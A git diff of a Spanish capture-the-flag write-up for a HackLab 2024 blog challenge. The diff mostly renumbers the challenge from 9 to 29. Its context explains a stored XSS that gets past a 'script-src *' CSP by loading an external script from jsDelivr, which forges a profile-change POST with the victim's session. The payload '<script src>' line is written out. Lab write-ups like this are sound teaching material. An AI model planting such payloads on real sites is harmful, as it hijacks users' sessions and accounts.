@@ -1,4 +1,4 @@
-# Desafío 9 - Blog HackLab (HackLab 2024)
+# Desafío 29 - Blog HackLab (HackLab 2024)
 
 **Plataforma:** HackLab (SoftwareSeguro)  
 **Edición:** HackLab 2024  
@@ -6,7 +6,7 @@
 
 ## Análisis
 
-Tercera versión del "Blog de Pepe" (después del Desafío 7 y el Desafío 8, y antes del Desafío 10). El objetivo ya no es publicar un comentario en nombre de la víctima, sino **modificar la foto de perfil del usuario `pepe`**. El blog expone además un mecanismo explícito ("Engañar a Pepe para que ingrese al Blog") que fuerza a que Pepe visite la URL del desafío, con un límite de una vez por minuto.
+Tercera versión del "Blog de Pepe" (después del Desafío 7 y el Desafío 8, y antes del Desafío 43). El objetivo ya no es publicar un comentario en nombre de la víctima, sino **modificar la foto de perfil del usuario `pepe`**. El blog expone además un mecanismo explícito ("Engañar a Pepe para que ingrese al Blog") que fuerza a que Pepe visite la URL del desafío, con un límite de una vez por minuto.
 
 El campo de comentarios **no sanitiza ni codifica la salida**: `<b>test</b>` se renderiza en negrita, es decir el HTML enviado se re-inyecta tal cual en la página (Stored XSS). Sin embargo, la aplicación agrega una CSP en el `<head>`:
 
@@ -23,7 +23,7 @@ Esta CSP es la clave del desafío. `script-src *` **parece** restrictiva, pero e
   Either the 'unsafe-inline' keyword, a hash (...), or a nonce (...) is required to enable inline execution.
   ```
 
-  ![Desafío 9 - Blog HackLab (HackLab 2024) - CSP bloqueando scripts y event handlers inline](assets/01.png)
+  ![Desafío 29 - Blog HackLab (HackLab 2024) - CSP bloqueando scripts y event handlers inline](assets/01.png)
 
 - Pero el comodín `*` autoriza scripts remotos de **cualquier origen**. Un `<script src="https://dominio-atacante/x.js"></script>` sí está permitido.
 
@@ -37,12 +37,12 @@ La combinación es: **Stored XSS + CSP mal configurada (`script-src *`) + falta 
 
 La CSP `script-src *` permite orígenes externos, pero el navegador (ORB - Opaque Response Blocking) **bloquea** un `<script src>` cross-origin cuyo `Content-Type` no sea de script válido. Un raw de GitHub Gist se sirve como `text/plain` y queda bloqueado (`net::ERR_BLOCKED_BY_ORB`).
 
-![Desafío 9 - Blog HackLab (HackLab 2024) - script externo bloqueado por ORB](assets/02.png)
+![Desafío 29 - Blog HackLab (HackLab 2024) - script externo bloqueado por ORB](assets/02.png)
 
 La solución es servir el `.js` desde un origen que devuelva `Content-Type: application/javascript`. jsDelivr sobre un repo público de GitHub lo hace correctamente:
 
 ```
-https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-9-blog-hacklab-2024/assets/x.js
+https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-29-blog-hacklab-2024/assets/x.js
 ```
 
 El script (`assets/x.js`) forja el `POST` a `/profile` con una imagen embebida, usando `FormData` y la sesión de la víctima:
@@ -81,20 +81,20 @@ Se publica como comentario el `<script>` que apunta al archivo alojado:
 En este caso, la URL real usada fue:
 
 ```html
-<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-9-blog-hacklab-2024/assets/x.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-29-blog-hacklab-2024/assets/x.js"></script>
 ```
 
 Probando primero con la propia sesión (`hacklab`), se confirma que el vector funciona de punta a punta: la bio cambia a "pwned by hacklab" y la foto de perfil a la imagen inyectada.
 
-![Desafío 9 - Blog HackLab (HackLab 2024) - perfil propio modificado por el PoC](assets/03.png)
+![Desafío 29 - Blog HackLab (HackLab 2024) - perfil propio modificado por el PoC](assets/03.png)
 
 ### 3. Forzar la visita de Pepe
 
 Se usa el campo "Engañar a Pepe para que ingrese al Blog" con el dominio del desafío (protocolo + dominio, sin path). Cuando Pepe carga la página, el navegador ejecuta el script externo (permitido por `script-src *`), que dispara el `POST /profile` con la sesión de Pepe y le cambia la foto de perfil.
 
-![Desafío 9 - Blog HackLab (HackLab 2024) - flag](assets/04.png)
+![Desafío 29 - Blog HackLab (HackLab 2024) - flag](assets/04.png)
 
-![Desafío 9 - Blog HackLab (HackLab 2024) - foto de perfil de pepe modificada](assets/05.png)
+![Desafío 29 - Blog HackLab (HackLab 2024) - foto de perfil de pepe modificada](assets/05.png)
 
 ## Flag
 
